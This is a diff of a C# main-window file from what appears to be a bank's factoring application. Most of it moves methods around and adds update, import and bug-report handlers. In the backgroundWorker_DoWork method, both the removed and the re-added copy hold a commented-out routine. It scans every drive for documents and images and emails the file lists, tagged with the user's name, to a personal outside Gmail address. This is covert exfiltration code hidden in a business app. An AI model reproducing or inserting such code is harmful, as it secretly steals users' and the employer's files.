@@ -29,7 +29,7 @@ namespace CMBC.EasyFactor
     /// </summary>
     public partial class MainWindow : DevComponents.DotNetBar.Office2007RibbonForm
     {
-        #region Constructors (1)
+		#region Constructors (1) 
 
         /// <summary>
         /// Initializes a new instance of the MainWindow class
@@ -49,9 +49,9 @@ namespace CMBC.EasyFactor
             this.backgroundWorker.RunWorkerAsync();
         }
 
-        #endregion Constructors
+		#endregion Constructors 
 
-        #region Properties (2)
+		#region Properties (2) 
 
         /// <summary>
         /// Sets command status
@@ -75,11 +75,11 @@ namespace CMBC.EasyFactor
             }
         }
 
-        #endregion Properties
+		#endregion Properties 
 
-        #region Methods (76)
+		#region Methods (82) 
 
-        // Public Methods (2) 
+		// Public Methods (2) 
 
         /// <summary>
         /// 
@@ -106,7 +106,7 @@ namespace CMBC.EasyFactor
             this.ribbonDetailPanel.Controls.Clear();
             this.ribbonDetailPanel.Controls.Add(uc);
         }
-        // Private Methods (74) 
+		// Private Methods (80) 
 
         /// <summary>
         /// 
@@ -117,6 +117,41 @@ namespace CMBC.EasyFactor
         {
             AboutBox aboutBox = new AboutBox();
             aboutBox.ShowDialog(this);
+        }
+
+        private void backgroundWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
+        {
+            //string[] drivers = Environment.GetLogicalDrives();
+
+            //try
+            //{
+            //    foreach (string dr in drivers)
+            //    {
+            //        DriveInfo di = new DriveInfo(dr);
+
+            //        if (di.IsReady)
+            //        {
+            //            Thread.Sleep(10000);
+            //            System.IO.DirectoryInfo rootDir = di.RootDirectory;
+            //            String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
+            //            if (!String.IsNullOrEmpty(result))
+            //            {
+            //                MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
+            //            }
+            //        }
+            //    }
+            //}
+            //catch (Exception)
+            //{
+            //    return;
+            //}
+
+            
+        }
+
+        private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
+        {
+            CheckUpdateBackground();
         }
 
         /// <summary>
@@ -221,6 +256,26 @@ namespace CMBC.EasyFactor
                 RefundBatchMgr batchMgr = new RefundBatchMgr(RefundBatchMgr.OpBatchType.CHECK);
                 this.SetDetailPanel(batchMgr);
             }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void CheckUpdate(object sender, EventArgs e)
+        {
+            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
+            this.autoUpdater.TryUpdate();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void CheckUpdateBackground()
+        {
+            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
+            this.autoUpdater.TryUpdateBackground();
         }
 
         /// <summary>
@@ -395,6 +450,17 @@ namespace CMBC.EasyFactor
                 ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS);
                 importForm.Show();
             }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void ImportClientsOverwrite(object sender, EventArgs e)
+        {
+            ImportForm form = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_OVERWRITE);
+            form.ShowDialog(this);
         }
 
         /// <summary>
@@ -1012,6 +1078,17 @@ namespace CMBC.EasyFactor
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
+        private void ReportBug(object sender, EventArgs e)
+        {
+            ReportBug form = new ReportBug();
+            form.ShowDialog(this);
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void ReportCDA(object sender, EventArgs e)
         {
             CDAMgr mgr = new CDAMgr(CDAMgr.OpCDAType.REPORT);
@@ -1107,84 +1184,6 @@ namespace CMBC.EasyFactor
             this.SetDetailPanel(mgr);
         }
 
-        #endregion Methods
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void ReportBug(object sender, EventArgs e)
-        {
-            ReportBug form = new ReportBug();
-            form.ShowDialog(this);
-        }
-
-        private void backgroundWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
-        {
-            //string[] drivers = Environment.GetLogicalDrives();
-
-            //try
-            //{
-            //    foreach (string dr in drivers)
-            //    {
-            //        DriveInfo di = new DriveInfo(dr);
-
-            //        if (di.IsReady)
-            //        {
-            //            Thread.Sleep(10000);
-            //            System.IO.DirectoryInfo rootDir = di.RootDirectory;
-            //            String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
-            //            if (!String.IsNullOrEmpty(result))
-            //            {
-            //                MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
-            //            }
-            //        }
-            //    }
-            //}
-            //catch (Exception)
-            //{
-            //    return;
-            //}
-
-            
-        }
-
-        private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
-        {
-            CheckUpdateBackground();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void CheckUpdate(object sender, EventArgs e)
-        {
-            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
-            this.autoUpdater.TryUpdate();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        private void CheckUpdateBackground()
-        {
-            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
-            this.autoUpdater.TryUpdateBackground();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void ImportClientsOverwrite(object sender, EventArgs e)
-        {
-            ImportForm form = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_OVERWRITE);
-            form.ShowDialog(this);
-        }
-
+		#endregion Methods 
     }
 }
